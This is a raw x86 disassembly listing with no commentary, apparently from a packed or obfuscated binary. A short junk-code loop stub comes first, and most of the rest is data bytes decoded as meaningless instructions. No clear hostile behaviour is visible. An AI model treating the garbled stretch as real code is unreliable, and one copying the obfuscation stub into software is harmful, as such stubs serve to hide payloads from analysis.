  40183e:	sub    ch,BYTE PTR [ebx]
  401840:	cdq    
  401841:	cld    
  401842:	cmp    DWORD PTR [edi],ebp
  401844:	mov    esi,0x3c0e3574
  401849:	inc    esi
  40184a:	mov    DWORD PTR [ebp-0x20],eax
  40184d:	neg    DWORD PTR ds:0x430516
  401853:	push   ebx
  401854:	lea    eax,[ebp-0x18]
  401857:	xor    DWORD PTR ds:0x42e7e2,ebx
  40185d:	mov    DWORD PTR [ebp-0x1c],eax
  401860:	mov    eax,DWORD PTR [ebp-0x1c]
  401863:	xor    ecx,0x76fe
  401869:	push   esi
  40186a:	sbb    ecx,ecx
  40186c:	push   edi
  40186d:	adc    DWORD PTR ds:0x4305c6,ebx
  401873:	mov    edi,0xf89f2dad
  401878:	mov    DWORD PTR [eax],edi
  40187a:	mov    DWORD PTR ds:0x4305c2,0x13
  401884:	cmp    DWORD PTR ds:0x4305c2,0x0
  40188b:	je     0x4018c5
  401891:	cmp    DWORD PTR ds:0x4305c2,0x21
  401898:	jne    0x4018a9
  40189e:	push   0x4555
  4018a3:	call   DWORD PTR ds:0x42eb24
  4018a9:	mov    ebx,DWORD PTR ds:0x4305c2
  4018af:	dec    ebx
  4018b0:	mov    DWORD PTR ds:0x4305c2,ebx
  4018b6:	jmp    0x401884
  4018bb:	add    DWORD PTR ds:0x42e7de,0x42e7e2
  4018c5:	mov    eax,DWORD PTR [ebp-0x14]
  4018c8:	or     ecx,0x5402
  4018ce:	mov    ebx,DWORD PTR [ebp-0x8]
  4018d1:	mov    ecx,0x7510856
  4018d6:	xor    eax,ecx
  4018d8:	mov    esi,0x32729d
  4018dd:	sbb    DWORD PTR ds:0x430532,0x704c
  4018e7:	xor    ebx,ecx
  4018e9:	xor    edx,edx
  4018eb:	xor    DWORD PTR ds:0x42e7ea,0x4305c2
  4018f5:	add    eax,esi
  4018f7:	add    ebx,esi
  4018f9:	sbb    DWORD PTR ds:0x4305d2,0x21a7
  401903:	jmp    0x401cb4
  401908:	ret    0xa9a5
  40190b:	imul   ebp,DWORD PTR [ecx+0x7b],0xffffffc4
  40190f:	mov    ebp,0x8064be64
  401914:	and    edi,DWORD PTR [edi]
  401916:	jae    0x4018e8
  401918:	push   ss
  401919:	jne    0x401999
  40191b:	jle    0x40189f
  40191d:	jno    0x40199d
  40191f:	jle    0x401945
  401921:	push   cs
  401922:	das    
  401923:	or     dh,BYTE PTR gs:[edi]
  401926:	cmp    BYTE PTR [eax],cl
  401928:	pop    ss
  401929:	mov    al,ds:0xfc8e3361
  40192e:	xchg   ebp,eax
  40192f:	adc    ch,BYTE PTR [ebx]
  401931:	pusha  
  401932:	push   esi
  401933:	or     bh,BYTE PTR [ecx]
  401935:	jne    0x401931
  401937:	into   
  401938:	jnp    0x401971
  40193a:	dec    esp
  40193b:	jnp    0x401965
  40193d:	xchg   ebp,eax
  40193e:	je     0x40191f
  401940:	fnsave [ebx-0x1465f7a4]
  401946:	mov    DWORD PTR [ecx-0x5d2e9b25],edx
  40194c:	in     eax,0xcb
  40194e:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  401950:	cmc    
  401951:	and    eax,0x37841f05
  401956:	loopne 0x4018fc
  401958:	dec    ebp
  401959:	fcom   QWORD PTR [eax+0x1b]
  40195c:	inc    ebp
  40195d:	cmp    BYTE PTR [ecx+0x44],ah
  401960:	call   0x5363:0x18e497d6
  401967:	xlat   BYTE PTR ds:[ebx]
  401968:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401969:	out    dx,al
  40196a:	sbb    eax,esi
  40196c:	(bad)  
  40196d:	sbb    BYTE PTR [ecx+edx*8],dh
  401970:	add    esp,DWORD PTR [ecx]
  401972:	in     eax,0xad
  401974:	cwde   
  401975:	adc    al,0xae
  401977:	and    al,0x30
  401979:	sub    BYTE PTR [esi-0x44],dl
  40197c:	repnz popa 
  40197e:	mov    bh,ch
  401980:	jl     0x40191b
  401982:	stos   BYTE PTR es:[edi],al
  401983:	ds and eax,0x76af8f77
  401989:	cmc    
  40198a:	mov    al,0x29
  40198c:	loopne 0x4019cb
  40198e:	mov    cl,0xf6
  401990:	jno    0x40197b
  401992:	out    dx,al
  401993:	fneni(8087 only) 
  401995:	add    ch,0x76
  401998:	push   esi
  401999:	hlt    
  40199a:	xor    eax,0x168a6861
  40199f:	pop    ebx
  4019a0:	dec    ecx
  4019a1:	lods   eax,DWORD PTR ds:[esi]
  4019a2:	or     dh,BYTE PTR [edx]
  4019a4:	nop
  4019a5:	mov    esi,DWORD PTR [ebx+0x63]
  4019a8:	loop   0x40199f
  4019aa:	je     0x401992
  4019ac:	mov    cl,0xc9
  4019ae:	mov    dh,0x24
  4019b0:	enter  0xa795,0xf1
  4019b4:	das    
  4019b5:	shr    BYTE PTR es:[esi+0x1e5caa8],1
  4019bc:	inc    edx
  4019bd:	shr    DWORD PTR [edx-0x6b1c21e8],cl
  4019c3:	push   es
  4019c4:	dec    ecx
  4019c5:	pop    esp
  4019c6:	cmc    
  4019c7:	mov    ah,0x46
  4019c9:	push   edx
  4019ca:	xor    cl,bl
  4019cc:	(bad)  
  4019cd:	aam    0xb0
  4019cf:	fcomp  QWORD PTR [ebx-0x61]
  4019d2:	mov    bh,0x58
  4019d4:	adc    DWORD PTR [ecx+0xf],ebx
  4019d7:	jae    0x4019c4
  4019d9:	jmp    0x19ac:0x67f38657
  4019e0:	out    dx,eax
  4019e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019e2:	xlat   BYTE PTR ds:[ebx]
  4019e3:	cmp    eax,0x7ddd2183
  4019e8:	adc    DWORD PTR [ebp-0x713fc75a],esi
  4019ee:	mov    bh,0x32
  4019f0:	addr16 xchg esp,eax
  4019f2:	adc    eax,0x9724a110
  4019f7:	iret   
  4019f8:	aas    
  4019f9:	pop    edi
  4019fa:	out    dx,al
  4019fb:	pop    edi
  4019fc:	cmp    al,0x47
  4019fe:	xor    bl,BYTE PTR [esp+edx*4-0x5664fb9e]
  401a05:	and    DWORD PTR [esi+0x78],esp
  401a08:	mov    al,BYTE PTR [edi+0x1]
  401a0b:	push   0x55ffe697
  401a10:	jmp    0x401a19
  401a12:	sbb    eax,0xace47289
  401a17:	ficomp WORD PTR ds:0x83670faf
  401a1d:	sub    BYTE PTR [edx],dl
  401a1f:	xchg   DWORD PTR [eax+0x6f],edi
  401a22:	sub    al,0x23
  401a24:	add    edi,esi
  401a26:	fldcw  WORD PTR [ebx+0x2a]
  401a29:	int    0x23
  401a2b:	xchg   edi,eax
  401a2c:	cdq    
  401a2d:	(bad)  
  401a2e:	out    0x44,al
  401a30:	pop    ss
  401a31:	push   ecx
  401a32:	and    bl,BYTE PTR [esi-0x1d]
  401a35:	aam    0x14
  401a37:	xor    DWORD PTR [esi-0x7d851abe],0x726ee291
  401a41:	iret   
  401a42:	jl     0x401abe
  401a44:	sub    ah,BYTE PTR [ebx-0x3a2748c7]
  401a4a:	loopne 0x401a3b
  401a4c:	pop    ecx
  401a4d:	sbb    al,0x2b
  401a4f:	sbb    bl,ah
  401a51:	je     0x401ab5
  401a53:	aad    0xbc
  401a55:	adc    eax,0xec032151
  401a5a:	inc    esp
  401a5b:	and    eax,0xf89df310
  401a60:	idiv   ebx
  401a62:	jns    0x401adb
  401a64:	hlt    
  401a65:	aaa    
  401a66:	adc    eax,0x51bd81fa
  401a6b:	imul   ebx,DWORD PTR [ecx-0x17],0x35692c82
  401a72:	(bad)  
  401a73:	jo     0x401a00
  401a75:	imul   ebp,DWORD PTR [eax],0x944066d2
  401a7b:	jle    0x401a0e
  401a7d:	adc    ebp,ebp
  401a7f:	dec    esp
  401a80:	jecxz  0x401ab6
  401a82:	fcmovu st,st(3)
  401a84:	inc    esp
  401a85:	sbb    esp,DWORD PTR [edi]
  401a87:	dec    esp
  401a88:	jns    0x401a71
  401a8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a8b:	test   BYTE PTR [eax-0x85eb725],bl
  401a91:	scas   eax,DWORD PTR es:[edi]
  401a92:	aam    0xbf
  401a94:	mov    eax,0xcdd7a0bf
  401a99:	imul   edi,esi,0x6
  401a9c:	mov    dh,0xaa
  401a9e:	imul   esp,DWORD PTR [esi+0x6e94c0ee],0xffffffa8
  401aa5:	mov    bl,0xcc
  401aa7:	sar    dh,cl
  401aa9:	jmp    0xe056:0x60a8e30f
  401ab0:	ss hlt 
  401ab2:	jle    0x401a66
  401ab4:	retf   
  401ab5:	push   cs
  401ab6:	shl    esi,0x8
  401ab9:	pop    ebp
  401aba:	fisttp QWORD PTR [ebp+0x14]
  401abd:	and    ch,BYTE PTR [ebx]
  401abf:	ds pop edi
  401ac1:	xchg   BYTE PTR [ebp-0x2b],al
  401ac4:	fs or  cl,al
  401ac7:	js     0x401a65
  401ac9:	xor    al,0x3b
  401acb:	aad    0x9f
  401acd:	repz push es
  401acf:	adc    al,BYTE PTR [ebx+0x56]
  401ad2:	cmp    esi,eax
  401ad4:	cmp    eax,0x319b873b
  401ad9:	(bad)  
  401ada:	ficomp DWORD PTR [edi+0x1d]
  401add:	out    0x9b,al
  401adf:	adc    cl,BYTE PTR [esi+0x3e0d07a0]
  401ae5:	xchg   edx,eax
  401ae6:	xor    eax,0x74ed6797
  401aeb:	sub    DWORD PTR [ebx-0x6ead5c53],0x2e7ab385
  401af5:	jmp    0x7d01:0xe3c413e1
  401afc:	or     edi,ebp
  401afe:	jnp    0x401b39
  401b00:	icebp  
  401b01:	outs   dx,BYTE PTR ds:[esi]
  401b02:	mov    ch,0xad
  401b04:	mov    fs,esi
  401b06:	or     al,0xae
  401b08:	pop    ds
  401b09:	or     BYTE PTR [ecx],0x18
  401b0c:	sub    al,BYTE PTR [ebp-0x6c]
  401b0f:	pushf  
  401b10:	pop    ebx
  401b11:	out    dx,eax
  401b12:	(bad)  
  401b13:	pop    ebx
  401b14:	inc    ebx
  401b15:	xchg   edx,eax
  401b16:	ror    DWORD PTR [ebx],1
  401b18:	cs pop esp
  401b1a:	out    0x95,eax
  401b1c:	cmp    esi,DWORD PTR [eax+0x29]
  401b1f:	xchg   ecx,eax
  401b20:	xchg   edx,eax
  401b21:	adc    esp,DWORD PTR [ebp-0x43]
  401b24:	xor    DWORD PTR [edi-0x77],eax
  401b27:	loop   0x401b6e
  401b29:	pop    eax
  401b2a:	popf   
  401b2b:	push   cs
  401b2c:	dec    ebx
  401b2d:	addr16 jge 0x401b29
  401b30:	outs   dx,DWORD PTR ds:[esi]
  401b31:	jmp    0x401b0c
  401b33:	jno    0x401b81
  401b35:	(bad)  
  401b36:	lods   eax,DWORD PTR ds:[esi]
  401b37:	data16 js 0x401b3c
  401b3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b3b:	push   0xffffffa9
  401b3d:	jp     0x401b29
  401b3f:	ror    BYTE PTR [ecx+eiz*1-0x4d4e7ed],cl
  401b46:	adc    DWORD PTR [ebx+0x2a],esi
  401b49:	push   edx
  401b4a:	pop    ecx
  401b4b:	push   ecx
  401b4c:	xlat   BYTE PTR ds:[ebx]
  401b4d:	adc    esp,DWORD PTR [edx]
  401b4f:	in     eax,dx
  401b50:	mov    esi,0x76df8de4
  401b55:	fld    DWORD PTR ds:[esi-0x13]
  401b59:	mov    ecx,0x51e2b299
  401b5e:	push   es
  401b5f:	pop    ss
  401b60:	mov    ah,0x39
  401b62:	sbb    BYTE PTR [ebp+0x71],cl
  401b65:	and    eax,0xcd25502
  401b6a:	xlat   BYTE PTR ds:[ebx]
  401b6b:	les    esi,FWORD PTR [esi]
  401b6d:	sub    al,0x45
  401b6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b70:	inc    edi
  401b71:	xchg   ecx,eax
  401b72:	imul   esi,DWORD PTR [ebx],0x1a
  401b75:	das    
  401b76:	dec    ebx
  401b77:	jmp    0x41d9cae0
  401b7c:	adc    esp,edi
  401b7e:	pop    esi
  401b7f:	pop    es
  401b80:	das    
  401b81:	fadd   DWORD PTR [edx+0x15]
  401b84:	mov    dl,0x5b
  401b86:	hlt    
  401b87:	adc    al,0xf7
  401b89:	xchg   ebx,eax
  401b8a:	and    eax,0xf9108bf6
  401b8f:	jno    0x401b16
  401b91:	push   cs
  401b92:	leave  
  401b93:	add    DWORD PTR [edx+0x44],0x1e5a168f
  401b9a:	imul   ebx,DWORD PTR [ebx-0x58],0x5c
  401b9e:	cwde   
  401b9f:	jl     0x401bf1
  401ba1:	push   ebp
  401ba2:	and    al,BYTE PTR [esi+ebp*1+0x7907e1b9]
  401ba9:	fnstcw WORD PTR [ebp+edi*8+0x8cad3c9]
  401bb0:	shr    DWORD PTR ds:0xdd6abc55,0x25
  401bb7:	push   ds
  401bb8:	les    edi,FWORD PTR [ebx]
  401bba:	dec    edx
  401bbb:	sbb    eax,DWORD PTR [edi+ebx*2+0x3135f32f]
  401bc2:	and    al,0x64
  401bc4:	sbb    edx,DWORD PTR [ebp+0x6ce72437]
  401bca:	js     0x401b79
  401bcc:	loope  0x401ba4
  401bce:	jmp    0x5f0b58d7
  401bd3:	mov    al,ds:0xa4f59145
  401bd8:	ss sti 
  401bda:	inc    ebx
  401bdb:	push   0x5a
  401bdd:	mov    edi,0xb7fa9f0e
  401be2:	adc    esi,DWORD PTR [ecx]
  401be4:	pop    edx
  401be5:	retf   
  401be6:	les    ebp,FWORD PTR [esi-0x25]
  401be9:	xchg   ebx,eax
  401bea:	sti    
  401beb:	daa    
  401bec:	jecxz  0x401b75
  401bee:	iret   
  401bef:	jmp    DWORD PTR [eax+edi*8]
  401bf2:	ror    DWORD PTR [ecx],cl
  401bf4:	inc    ecx
  401bf5:	mov    eax,0xf0522e02
  401bfa:	ficomp WORD PTR [ebx+0xcc7d652]
  401c00:	lods   al,BYTE PTR ds:[esi]
  401c01:	popa   
  401c02:	pop    edi
  401c03:	pop    edi
  401c04:	in     eax,dx
  401c05:	xlat   BYTE PTR ds:[ebx]
  401c06:	cmp    al,0x8f
  401c08:	add    eax,0xf669f44e
  401c0d:	push   cs
  401c0e:	adc    DWORD PTR [edx-0x58c89e6c],0x69
  401c15:	pushf  
  401c16:	inc    ebp
  401c17:	cmp    DWORD PTR [ebx],edx
  401c19:	lock std 
  401c1b:	xchg   DWORD PTR [esi+0x24],esi
  401c1e:	jmp    0x401c6a
  401c20:	sub    BYTE PTR [ebx-0x116b1b82],0x1d
  401c27:	gs pop edx
  401c29:	shl    BYTE PTR [edx+0x58],cl
  401c2c:	neg    BYTE PTR [edi-0x72]
  401c2f:	stos   BYTE PTR es:[edi],al
  401c30:	add    DWORD PTR [eax+esi*4+0x65],ebx
  401c34:	push   edi
  401c35:	mov    esp,0x29de4786
  401c3a:	jne    0x401ca3
  401c3c:	outs   dx,DWORD PTR ds:[esi]
  401c3d:	repz or BYTE PTR [eax],bh
  401c40:	rol    edx,0xdb
  401c43:	pop    edx
  401c44:	push   ebp
  401c45:	or     al,0x2b
  401c47:	pop    esp
  401c48:	leave  
  401c49:	ret    
  401c4a:	dec    ecx
  401c4b:	mov    ds:0xf3e3bd68,al
  401c50:	dec    esi
  401c51:	lods   eax,DWORD PTR ds:[esi]
  401c52:	inc    edx
  401c53:	push   edi
  401c54:	and    DWORD PTR [esi-0x634f9e05],ecx
  401c5a:	xor    DWORD PTR [eax+edi*4-0x4c7bef15],ebp
  401c61:	mov    gs,WORD PTR [esi+0x3b5f75ca]
  401c67:	pusha  
  401c68:	xchg   ebx,eax
  401c69:	sbb    ah,al
  401c6b:	call   0x3503:0x467c9205
  401c72:	aad    0x5f
  401c74:	rcl    BYTE PTR [ecx],0x2
  401c77:	or     DWORD PTR [eax],esi
  401c79:	mov    esp,0x73f3c395
  401c7e:	fadd   QWORD PTR [ecx+0x50dbdea8]
  401c84:	lahf   
  401c85:	mov    ecx,eax
  401c87:	xchg   edi,eax
  401c88:	xchg   edi,eax
  401c89:	js     0x401c0d
  401c8b:	dec    eax
  401c8c:	cmp    BYTE PTR [esi+ebx*2],ah
  401c8f:	cmp    DWORD PTR [ebx],ecx
  401c91:	push   edx
  401c92:	sbb    ah,BYTE PTR [edx-0x2e]
  401c95:	pop    ss
  401c96:	lea    eax,[eax-0x45d0f75d]
  401c9c:	hlt    
  401c9d:	push   esi
  401c9e:	(bad)  
  401c9f:	fiadd  DWORD PTR [ecx]
  401ca1:	jg     0x401c61
  401ca3:	adc    al,0x26
  401ca5:	push   esp
  401ca6:	fwait
  401ca7:	jg     0x401cfa
  401ca9:	loopne 0x401c34
  401cab:	retf   
  401cac:	pop    ebx
  401cad:	inc    esi
  401cae:	and    eax,DWORD PTR [edi+ebp*4-0x8dabd7f]
  401cb5:	xrelease mov DWORD PTR ds:0x42eea0,0x29
  401cc0:	jmp    0x402071
  401cc5:	pop    ds
  401cc6:	nop
  401cc7:	jl     0x401d20
  401cc9:	jge    0x401d46
  401ccb:	and    eax,0x749e668
  401cd0:	jns    0x401cec
  401cd2:	fs test al,0x98
  401cd5:	mov    edx,0x827e7e08
  401cda:	jno    0x401d5a
  401cdc:	jle    0x401cf3
  401cde:	aaa    
  401cdf:	add    DWORD PTR [ecx],0xc7dea937
  401ce5:	neg    DWORD PTR [edx-0x61]
  401ce8:	in     al,0x11
  401cea:	loopne 0x401cfe
  401cec:	leave  
  401ced:	enter  0xc897,0x6
  401cf1:	adc    DWORD PTR [esp+eiz*8+0x3f],ebx
  401cf5:	loopne 0x401d66
  401cf7:	out    dx,al
  401cf8:	pop    ss
  401cf9:	fisttp WORD PTR [edi+0x18]
  401cfc:	jmp    0xe4b30adf
  401d01:	in     eax,dx
  401d02:	jecxz  0x401d5a
  401d04:	les    esi,FWORD PTR [edi+0xa047e65]
  401d0a:	xor    BYTE PTR [ebx+ebp*8],0x47
  401d0e:	jno    0x401c9d
  401d10:	gs dec esp
  401d12:	sti    
  401d13:	pushf  
  401d14:	scas   al,BYTE PTR es:[edi]
  401d15:	inc    ebx
  401d16:	stc    
  401d17:	sbb    BYTE PTR ds:0x364b87e,cl
  401d1d:	aam    0xd4
  401d1f:	jnp    0x401d24
  401d21:	call   0xe54c:0x679fdd44
  401d28:	cmp    DWORD PTR [eax*8+0x5a64aa83],esp
  401d2f:	sbb    DWORD PTR [ecx-0x18554d87],edi
  401d35:	xor    eax,0x93332b4b
  401d3a:	fisubr WORD PTR [ebp+0x4e658662]
  401d40:	jmp    0xd0ba:0x9c9cff5b
  401d47:	(bad)  
  401d48:	pusha  
  401d49:	xchg   edx,eax
  401d4a:	lock jno 0x401d7d
  401d4d:	(bad)  
  401d4e:	dec    DWORD PTR [ebx-0x58]
  401d51:	dec    ecx
  401d52:	sbb    BYTE PTR [edx+eiz*2+0x7c],dh
  401d56:	jp     0x401d10
  401d58:	xchg   edi,eax
  401d59:	aaa    
  401d5a:	jnp    0x401dd2
  401d5c:	sub    ecx,esi
  401d5e:	jl     0x401dd2
  401d60:	pop    eax
  401d61:	cwde   
  401d62:	inc    ecx
  401d63:	sti    
  401d64:	fs clc 
  401d66:	add    al,0x2
  401d68:	push   0x57
  401d6a:	imul   ebp,DWORD PTR [edi+0x62000dea],0x4
  401d71:	push   ebp
  401d72:	fstp   TBYTE PTR ss:[ebx-0x2c2e9a40]
  401d79:	jae    0x401dc9
  401d7b:	pop    edx
  401d7c:	mov    ?,WORD PTR [esi+0x30]
  401d7f:	test   BYTE PTR [edi+0x19cf90a8],0x50
  401d86:	jb     0x401de1
  401d88:	pop    edi
  401d89:	jb     0x401d4a
  401d8b:	sub    al,0xd0
  401d8d:	call   0xc3e1:0x8f42c09f
  401d94:	les    esi,FWORD PTR [edx+0x3a4ed8d]
  401d9a:	cld    
  401d9b:	daa    
  401d9c:	inc    esi
  401d9d:	sbb    al,0x9b
  401d9f:	adc    esi,DWORD PTR [edx-0x21]
  401da2:	mov    eax,ds:0x480bdfe0
  401da7:	xor    al,0x88
  401da9:	mov    bh,0x8b
  401dab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401dac:	mov    ebx,0x1baffcd4
  401db1:	shl    BYTE PTR [eax],cl
  401db3:	fisub  WORD PTR [ebx+eax*2]
  401db6:	fadd   QWORD PTR ds:[ecx+0x5]
  401dba:	cmp    BYTE PTR ds:0xb30f044a,0x9
  401dc1:	adc    eax,0xe22dbdb2
  401dc6:	shl    BYTE PTR [edx],0x1
  401dc9:	cmp    ch,BYTE PTR [esi-0x33]
  401dcc:	dec    esp
  401dcd:	sar    DWORD PTR [ebx],cl
  401dcf:	mov    ch,0x69
  401dd1:	out    0x6b,al
  401dd3:	xchg   DWORD PTR [edi],edx
  401dd5:	call   0x2360:0x950332fc
  401ddc:	mov    ah,BYTE PTR [ebp+edx*1+0x29]
  401de0:	test   al,0x4e
  401de2:	repnz fwait
  401de4:	xchg   esp,eax
  401de5:	int    0x0
  401de7:	fdiv   QWORD PTR [eax+0x22a24e9]
  401ded:	jns    0x401de0
  401def:	std    
  401df0:	pushf  
  401df1:	inc    ebp
  401df2:	cmp    al,0x40
  401df4:	nop    edx
  401df7:	mov    ebp,0x1399929c
  401dfc:	mov    cl,0xc0
  401dfe:	rol    DWORD PTR [edx+0x2d],0x1b
  401e02:	sub    edx,ecx
  401e04:	jae    0x401d9a
  401e06:	adc    BYTE PTR [ecx+0x66],dl
  401e09:	leave  
  401e0a:	xchg   ebx,eax
  401e0b:	jne    0x401d97
  401e0d:	add    edx,DWORD PTR [di-0x5f8b]
  401e12:	fisubr WORD PTR [eax+0x322d59b2]
  401e18:	sbb    BYTE PTR [eax-0x17],ah
  401e1b:	rcr    BYTE PTR [edx+0x57],cl
  401e1e:	imul   esi,DWORD PTR gs:[edi+esi*1],0x2da6b965
  401e26:	or     ah,cl
  401e28:	leave  
  401e29:	and    eax,0x39bc8149
  401e2e:	iret   
  401e2f:	mov    edx,0x3c594cc2
  401e34:	xor    bh,BYTE PTR [edi-0x15]
  401e37:	mov    ?,WORD PTR [eax-0x1d]
  401e3a:	mov    ecx,eax
  401e3c:	lods   eax,DWORD PTR ds:[esi]
  401e3d:	push   cs
  401e3e:	not    ah
  401e40:	pop    edi
  401e41:	add    al,0x87
  401e44:	and    eax,0x2d791c57
  401e49:	or     BYTE PTR [ebp-0x48],0xd4
  401e4d:	or     al,0x42
  401e4f:	dec    edi
  401e50:	scas   al,BYTE PTR es:[edi]
  401e51:	out    dx,eax
  401e52:	sbb    DWORD PTR [ecx],0x3a
  401e55:	ja     0x401e5a
  401e57:	shl    edi,1
  401e59:	pop    esi
  401e5a:	cwde   
  401e5b:	mov    eax,0x234ee65d
  401e60:	jae    0x401e93
  401e62:	adc    eax,0x686939e9
  401e67:	inc    edi
  401e68:	cwde   
  401e69:	idiv   DWORD PTR [ecx]
  401e6b:	inc    ebx
  401e6c:	leave  
  401e6d:	inc    edx
  401e6e:	cmc    
  401e6f:	xor    DWORD PTR [ebx+0x27134539],0x94b4b3d7
  401e79:	pop    eax
  401e7a:	ficom  WORD PTR [ebp-0x6aa81929]
  401e80:	std    
  401e81:	clc    
  401e82:	fisubr DWORD PTR [ecx]
  401e84:	add    esi,DWORD PTR [esi-0x3e0591d9]
  401e8a:	out    dx,eax
  401e8b:	jge    0x401ecc
  401e8d:	cmp    si,WORD PTR [esi+0x4d7844e5]
  401e94:	cmp    eax,esi
  401e96:	cdq    
  401e97:	sbb    ch,cl
  401e99:	xor    dl,BYTE PTR [eax]
  401e9b:	popa   
  401e9c:	push   0xffffffef
  401e9e:	add    DWORD PTR [ebx],0x27a36295
  401ea4:	inc    ebp
  401ea5:	jge    0x401ee5
  401ea7:	xchg   edx,eax
  401ea8:	into   
  401ea9:	cmp    DWORD PTR [ecx+0x50],ebx
  401eac:	(bad)  
  401ead:	mov    DWORD PTR [esi],ebp
  401eaf:	mov    dl,0xd6
  401eb1:	(bad)  
  401eb2:	cli    
  401eb3:	ficomp WORD PTR [ecx-0x7a]
  401eb6:	outs   dx,BYTE PTR ds:[esi]
  401eb7:	mov    esp,0x4c0b1124
  401ebc:	or     DWORD PTR [edi+0xe644306],ebp
  401ec2:	sbb    eax,0x74f290d7
  401ec7:	mov    DWORD PTR [ebx-0x48],eax
  401eca:	cs js  0x401ebe
  401ecd:	lock xchg edx,eax
  401ecf:	je     0x401ee5
  401ed1:	mov    al,ds:0x61e3a08b
  401ed6:	add    eax,0x70d748bf
  401edb:	(bad)  
  401edc:	iret   
  401edd:	scas   al,BYTE PTR es:[edi]
  401ede:	mov    ecx,0x210c8466
  401ee3:	pop    ebx
  401ee4:	lea    ecx,[eax]
  401ee6:	jge    0x401f42
  401ee8:	dec    edi
  401ee9:	sahf   
  401eea:	add    cl,dl
  401eec:	cmp    DWORD PTR [ebp-0x57],esp
  401eef:	leave  
  401ef0:	stos   DWORD PTR es:[edi],eax
  401ef1:	push   es
  401ef2:	and    DWORD PTR [esp+ebp*1-0x106331ee],0x47
  401efa:	sub    al,0xc4
  401efc:	mov    eax,ds:0x28c97f54
  401f01:	mov    bh,0xa8
  401f03:	mov    ds:0x6bcddf14,eax
  401f08:	inc    edi
  401f09:	push   ss
  401f0a:	call   0x85ea72c
  401f0f:	sar    BYTE PTR [eax-0x1886558e],cl
  401f15:	stos   BYTE PTR es:[edi],al
  401f16:	popf   
  401f17:	cmp    DWORD PTR [ebx+0x71],ebx
  401f1a:	sbb    esi,DWORD PTR [ebx-0x217e0fed]
  401f20:	loop   0x401f2b
  401f22:	test   DWORD PTR [edx-0x73cf2164],esp
  401f28:	xchg   DWORD PTR ds:0xcfb030ad,ecx
  401f2e:	and    BYTE PTR [ecx-0xd79dd8d],bh
  401f34:	jae    0x401f40
  401f36:	stos   BYTE PTR es:[edi],al
  401f37:	aam    0x41
  401f39:	adc    al,0xe0
  401f3b:	mov    DWORD PTR [ebx-0x5e0be213],0x1d865f3b
  401f45:	xchg   esi,eax
  401f46:	pop    es
  401f47:	lds    esp,FWORD PTR [ebp+ebp*2+0x37a4c161]
  401f4e:	bswap  eax
  401f50:	push   ebx
  401f51:	mov    esp,0xbd2039b0
  401f56:	push   esi
  401f57:	invd   
  401f59:	jl     0x401fd1
  401f5b:	(bad)  
  401f5d:	shr    al,0x5d
  401f60:	xor    BYTE PTR [ecx-0x2cbd2feb],bh
  401f66:	xchg   edi,eax
  401f67:	dec    edx
  401f69:	or     ebx,DWORD PTR [ebp-0x29]
  401f6c:	push   edx
  401f6d:	mov    eax,0x94e391c8
  401f72:	rcl    bh,cl
  401f74:	pop    esi
  401f75:	dec    eax
  401f76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f77:	into   
  401f78:	mov    al,ds:0x924a6bf
  401f7d:	lods   al,BYTE PTR ds:[esi]
  401f7e:	xor    al,0x9c
  401f80:	push   0x7f
  401f82:	xor    DWORD PTR [ebp+0x40],0x8ea823c1
  401f89:	cli    
  401f8a:	add    BYTE PTR fs:[ebx+ebx*4],bh
  401f8e:	pusha  
  401f8f:	jle    0x401f62
  401f91:	stc    
  401f92:	mov    ecx,0x1f8d746d
  401f97:	and    ch,BYTE PTR [eax+0x701a2641]
  401f9d:	dec    ebx
  401f9e:	adc    eax,0x8055e89f
  401fa3:	and    edx,DWORD PTR [esi-0xd2068b4]
  401fa9:	pop    esp
  401faa:	xor    DWORD PTR [edx],ebp
  401fac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401fad:	out    dx,eax
  401fae:	mov    cl,0xad
  401fb0:	mov    ah,BYTE PTR [di-0x49e7]
  401fb5:	inc    eax
  401fb6:	dec    edx
  401fb7:	dec    edx
  401fb8:	xlat   BYTE PTR ds:[ebx]
  401fb9:	sbb    al,0x7e
  401fbb:	mov    ah,0xaf
  401fbd:	adc    DWORD PTR [edi+0x53],ebx
  401fc0:	scas   al,BYTE PTR es:[edi]
  401fc1:	add    cl,BYTE PTR [eax]
  401fc3:	ret    0xf064
  401fc6:	daa    
  401fc7:	daa    
  401fc8:	push   ecx
  401fc9:	and    al,0xff
  401fcc:	call   0x5b54:0xf6d976a
  401fd3:	les    edi,FWORD PTR [ecx-0x61050a36]
  401fd9:	adc    DWORD PTR [edx],0x6e2b49cb
  401fdf:	repnz fwait
  401fe1:	ss mov bl,0xc
  401fe4:	push   0x7e
  401fe6:	ret    0x2859
  401fe9:	test   DWORD PTR [esi-0x1ebbf4b6],esp
  401fef:	addr16 pop esi
  401ff1:	loopne 0x402058
  401ff3:	cli    
  401ff4:	dec    edi
  401ff5:	sub    BYTE PTR [edi],al
  401ff7:	cmp    eax,0xd4441844
  401ffc:	in     al,dx
  401ffd:	out    dx,al
  401ffe:	mov    ebp,0xd750dd1c
  402003:	xchg   ebx,eax
  402004:	stos   DWORD PTR es:[edi],eax
  402005:	mov    bl,0x9b
  402007:	cld    
  402008:	dec    edx
  402009:	rcr    BYTE PTR [ebx],1
  40200b:	pop    ds
  40200c:	xchg   ebp,eax
  40200d:	sub    eax,0x3d0940fe
  402012:	fstp   DWORD PTR ds:0xf639a3e1
  402018:	clc    
  402019:	push   eax
  40201a:	stos   BYTE PTR es:[edi],al
  40201b:	jns    0x401ffc
  40201d:	xor    al,0x8b
  40201f:	sbb    cl,BYTE PTR [edi]
  402021:	mov    ebp,0xd7e94bc1
  402026:	lahf   
  402027:	repz mov eax,0xe3843188
  40202d:	stos   DWORD PTR es:[edi],eax
  40202e:	inc    ebx
  40202f:	out    dx,eax
  402030:	pop    ss
  402031:	popa   
  402032:	mov    dl,0xd6
  402034:	and    ch,dh
  402036:	cmp    al,BYTE PTR [edx-0x34]
  402039:	xlat   BYTE PTR ds:[ebx]
  40203a:	imul   edi,ecx,0x3633076f
  402040:	(bad)
  402044:	ror    BYTE PTR [edx],cl
  402046:	jb     0x401fe5
  402048:	jb     0x40204c
